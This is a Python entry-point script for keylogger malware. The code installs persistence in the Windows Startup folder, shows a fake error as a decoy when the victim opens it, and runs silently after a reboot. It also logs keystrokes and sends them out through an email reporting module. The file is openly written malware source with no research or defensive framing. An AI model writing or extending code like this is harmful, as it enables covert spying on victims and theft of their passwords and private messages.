"""
Module: Main Entry Point
Description: Orchestrates the keylogger, network modules, and system persistence.
"""

import threading
from keylogger import Keylogger
from network import EmailSender
import deployment # Import the new module

def main():
    
    if not deployment.is_running_from_startup():
        # SCENARIO: USER CLICKED THE FILE (USB/Desktop)
        # We only want to show the error and install persistence 
        
        deployment.install_persistence()
        
        # Show Decoy Error 
        # We run this in a thread so the keylogger starts immediately
        error_thread = threading.Thread(target=deployment.show_fake_error)
        error_thread.start()
        
    else:
        # SCENARIO: AUTOMATIC RESTART
        # We are already in the Startup folder.
        # Don't show the error. Be completely silent.
        pass


    # Initialize components
    network = EmailSender()
    logger = Keylogger()
    
    # Start the network reporting in the background
    network.start()
    
    # Start the keylogger (this blocks the main thread- prevents the program from exiting)
    logger.start()

if __name__ == "__main__":
    main()
    
   